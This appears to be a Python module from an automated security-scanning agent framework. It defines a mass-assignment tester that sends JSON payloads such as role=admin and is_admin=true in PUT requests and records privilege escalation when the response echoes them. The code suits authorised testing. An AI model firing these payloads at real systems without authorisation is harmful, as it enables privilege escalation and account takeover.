# agents/specialists/mass_assignment_specialist.py
import logging
import uuid
from typing import List

import aiohttp

from agents.specialist_base import ISpecialist
from core.types import MultiSessionContext, TargetScope, VulnCategory
from triage.noise_filter import Finding

logger = logging.getLogger(__name__)


class MassAssignmentSpecialist(ISpecialist):
    """Mass Assignment specialist agent."""

    @property
    def category(self) -> VulnCategory:
        return VulnCategory.MASS_ASSIGNMENT

    async def scan(
        self,
        target: str,
        scope: TargetScope,
        session_ctx: MultiSessionContext,
        correlation_id: str,
    ) -> List[Finding]:
        findings = []

        if await self.check_false_positive(target):
            return findings

        # Payload attempting to overwrite privilege status
        payloads = [
            '{"role": "admin"}',
            '{"is_admin": true}',
            '{"privileges": ["admin"]}',
        ]

        async with aiohttp.ClientSession() as session:
            for p in payloads:
                try:
                    async with session.put(
                        target,
                        data=p,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                    ) as response:
                        body = await response.text()
                        if response.status == 200 and ("role" in body and "admin" in body):
                            finding = Finding(
                                finding_id=f"mass_assign_{uuid.uuid4().hex[:8]}",
                                title="Mass Assignment Privilege Escalation Confirmed",
                                description="Successfully modified user role/privileges via parameter pollution.",
                                vuln_category=self.category.value,
                                endpoint=target,
                                evidence={
                                    "payload": p,
                                    "response": body[:200],
                                },
                                confidence=0.9,
                            )
                            findings.append(finding)
                except Exception as e:
                    logger.warning(f"Error putting payload to {target}: {e}")

        return findings
